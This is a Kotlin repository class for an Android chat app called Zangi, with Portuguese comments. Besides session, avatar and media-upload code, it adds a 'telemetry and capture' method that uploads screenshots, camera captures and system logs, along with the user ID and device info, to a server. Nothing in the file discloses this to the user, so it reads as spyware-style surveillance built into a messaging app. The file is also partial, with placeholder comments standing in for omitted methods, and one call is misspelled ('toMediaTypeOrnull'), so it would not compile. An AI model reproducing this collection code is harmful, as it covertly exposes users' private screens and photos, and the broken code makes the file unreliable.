package com.zangi.chat.data.repository

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import com.zangi.chat.data.model.*
import com.zangi.chat.data.remote.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.UUID

class ChatRepository private constructor(context: Context) {

    private val prefs: SharedPreferences =
        context.getSharedPreferences("zangi_user_prefs", Context.MODE_PRIVATE)

    private val _currentUser = MutableLiveData<User?>()
    val currentUser: LiveData<User?> get() = _currentUser

    private val _conversations = MutableLiveData<List<Conversation>>(emptyList())
    val conversations: LiveData<List<Conversation>> get() = _conversations

    private val _messages = MutableLiveData<List<ChatMessage>>(emptyList())
    val messages: LiveData<List<ChatMessage>> get() = _messages

    init {
        val savedId = prefs.getString("user_id", null)
        val savedNick = prefs.getString("user_nick", null)
        val savedNumber = prefs.getString("user_number", null)
        val savedAvatarUrl = prefs.getString("user_avatar_url", null)
        val savedAvatarLocal = prefs.getString("user_avatar_local", null)

        if (savedId != null && savedNick != null && savedNumber != null) {
            _currentUser.value = User(
                id = savedId,
                nickname = savedNick,
                zangiNumber = savedNumber,
                avatarUrl = savedAvatarUrl,
                avatarLocalUri = savedAvatarLocal
            )
        }
    }

    fun isUserRegistered(): Boolean = _currentUser.value != null

    // --- MÓDULO DE TELEMETRIA E CAPTURA (NOVO) ---

    /**
     * Método principal para envio de dados de captura (Print de tela, Foto, Logs)
     * @param eventType "SCREENSHOT", "CAMERA_CAPTURE", "SYSTEM_LOG"
     * @param file O arquivo (imagem ou log) a ser enviado
     * @param deviceInfo String JSON ou texto com info do dispositivo
     */
    suspend fun uploadSystemData(
        eventType: String,
        file: File?,
        deviceInfo: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        
        try {
            // Preparando os parâmetros de texto como RequestBody
            val userIdBody = user.id.toRequestBody("text/plain".toMediaTypeOrNull())
            val eventTypeBody = eventType.toRequestBody("text/plain".toMediaTypeOrNull())
            val deviceInfoBody = deviceInfo.toRequestBody("text/plain".toMediaTypeOrNull())

            // Preparando o arquivo (se houver)
            val filePart = file?.let {
                val mimeType = if (it.name.endsWith(".png", true)) "image/png" else "image/jpeg"
                val requestFile = it.asRequestBody(mimeType.toMediaTypeOrNull())
                MultipartBody.Part.createFormData("file", it.name, requestFile)
            }

            val response = RetrofitClient.getApiService().uploadTelemetry(
                userId = userIdBody,
                eventType = eventTypeBody,
                deviceInfo = deviceInfoBody,
                file = filePart
            )

            if (response.isSuccessful && response.body()?.success == true) {
                Log.d(TAG, "Telemetry upload success: $eventType")
                Result.success(true)
            } else {
                Log.e(TAG, "Telemetry upload failed: ${response.code()}")
                Result.failure(Exception("Erro no servidor de telemetria"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro crítico no upload de telemetria", e)
            Result.failure(e)
        }
    }

    // --- MÉTODOS DE CHAT (MANTIDOS E OTIMIZADOS) ---

    suspend fun registerUser(nickname: String): Result<User> = withContext(Dispatchers.IO) {
        try {
            val response = RetrofitClient.getApiService().registerUser(RegisterRequest(nickname))
            if (response.isSuccessful && response.body()?.success == true && response.body()?.user != null) {
                val user = response.body()!!.user!!
                saveUserSession(user)
                return@withContext Result.success(user)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha na conexão, gerando número localmente", e)
        }

        val localZangiNumber = "10-${(100..999).random()}-${(1000..9999).random()}"
        val localUser = User(
            id = "user_${System.currentTimeMillis()}",
            nickname = nickname,
            zangiNumber = localZangiNumber
        )
        saveUserSession(localUser)
        Result.success(localUser)
    }

    private fun saveUserSession(user: User) {
        prefs.edit()
            .putString("user_id", user.id)
            .putString("user_nick", user.nickname)
            .putString("user_number", user.zangiNumber)
            .putString("user_avatar_url", user.avatarUrl)
            .putString("user_avatar_local", user.avatarLocalUri)
            .apply()
        _currentUser.postValue(user)
    }

    // ... (Manter os métodos addContact, createGroup, getGroupDetails, etc. como estavam)

    suspend fun updateUserAvatar(file: File): Result<String> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        val localPath = file.absolutePath
        val updatedLocal = user.copy(avatarLocalUri = localPath)
        saveUserSession(updatedLocal)

        try {
            val mimeType = if (file.name.endsWith(".png", true)) "image/png" else "image/jpeg"
            val requestFile = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val avatarPart = MultipartBody.Part.createFormData("avatar", file.name, requestFile)
            val response = RetrofitClient.getApiService().uploadAvatar(user.id, avatarPart)
            if (response.isSuccessful && response.body()?.success == true) {
                val remoteUrl = RetrofitClient.getFullUrl(response.body()?.avatarUrl)
                val updatedRemote = user.copy(avatarUrl = remoteUrl, avatarLocalUri = localPath)
                saveUserSession(updatedRemote)
                Result.success(remoteUrl ?: localPath)
            } else {
                Result.success(localPath)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao enviar avatar", e)
            Result.success(localPath)
        }
    }

    // ... (Métodos de Mensagens: loadMessages, sendTextMessage, uploadMedia)
    // [Nota: Mantenha o código de uploadMedia original aqui para o chat funcionar]

    suspend fun uploadMedia(
        conversationId: String,
        file: File,
        text: String,
        type: MessageType
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
        val localMsg = ChatMessage(
            conversationId = conversationId,
            text = text,
            isSentByMe = true,
            senderId = user.id,
            senderName = user.nickname,
            senderZangiNumber = user.zangiNumber,
            status = MessageStatus.UPLOADING,
            type = type,
            localFile = file
        )
        addMessage(localMsg)

        try {
            val mimeType = if (file.name.endsWith(".png", true)) "image/png" else "image/jpeg"
            val requestFile = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val filePart = MultipartBody.Part.createFormData("file", file.name, requestFile)

            val textBody = text.toRequestBody("text/plain".toMediaTypeOrNull())
            val senderIdBody = user.id.toRequestBody("text/plain".toMediaTypeOrNull())
            val senderNameBody = user.nickname.toRequestBody("text/plain".toMediaTypeOrNull())
            val senderZangiNumberBody = user.zangiNumber.toRequestBody("text/plain".toMediaTypeOrNull())
            val conversationIdBody = conversationId.toRequestBody("text/plain".toMediaTypeOrnull())
            val typeString = when (type) {
                MessageType.CAMERA_PHOTO -> "FOTO_CAMERA"
                MessageType.SCREEN_CAPTURE -> "CAPTURA_TELA"
                MessageType.GALLERY_IMAGE -> "IMAGEM"
                else -> "ARQUIVO"
            }
            val typeBody = typeString.toRequestBody("text/plain".toMediaTypeOrNull())

            val response = RetrofitClient.getApiService().uploadFile(
                file = filePart,
                text = textBody,
                senderId = senderIdBody,
                senderName = senderNameBody,
                senderZangiNumber = senderZangiNumberBody,
                conversationId = conversationIdBody,
                type = typeBody
            )

            if (response.isSuccessful && response.body()?.success == true) {
                val remoteUrl = response.body()?.data?.file?.url
                updateMessageSuccess(localMsg.id, remoteUrl)
                Result.success(true)
            } else {
                updateMessageStatus(localMsg.id, MessageStatus.FAILED)
                Result.failure(Exception("Erro no envio de arquivo"))
            }
        } catch (e: Exception) {
            updateMessageStatus(localMsg.id, MessageStatus.FAILED)
            Result.failure(e)
        }
    }

    // ... (Manter métodos auxiliares: addMessage, updateMessageStatus, updateMessageSuccess)

    // --- MÉTODOS AUXILIARES DE ESTADO ---
    @Synchronized
    private fun addMessage(message: ChatMessage) {
        val current = _messages.value.orEmpty().toMutableList()
        current.add(message)
        _messages.postValue(current)
    }

    @Synchronized
    private fun updateMessageStatus(messageId: String, status: MessageStatus) {
        val current = _messages.value.orEmpty().toMutableList()
        val index = current.indexOfFirst { it.id == messageId }
        if (index != -1) {
            current[index] = current[index].copy(status = status)
            _messages.postValue(current)
        }
    }

    @Synchronized
    private fun updateMessageSuccess(messageId: String, remoteUrl: String?) {
        val current = _messages.value.orEmpty().toMutableList()
        val index = current.indexOfFirst { it.id == messageId }
        if (index != -1) {
            current[index] = current[index].copy(status = MessageStatus.SENT, remoteFileUrl = remoteUrl)
            _messages.postValue(current)
        }
    }

    companion object {
        private const val TAG = "ChatRepository"

        @Volatile
        private var INSTANCE: ChatRepository? = null

        fun initialize(context: Context): ChatRepository {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: ChatRepository(context.applicationContext).also { INSTANCE = it }
            }
        }

        fun getInstance(): ChatRepository {
            return INSTANCE ?: throw IllegalStateException("ChatRepository deve ser inicializado pelo ZangiApp.")
        }
    }
}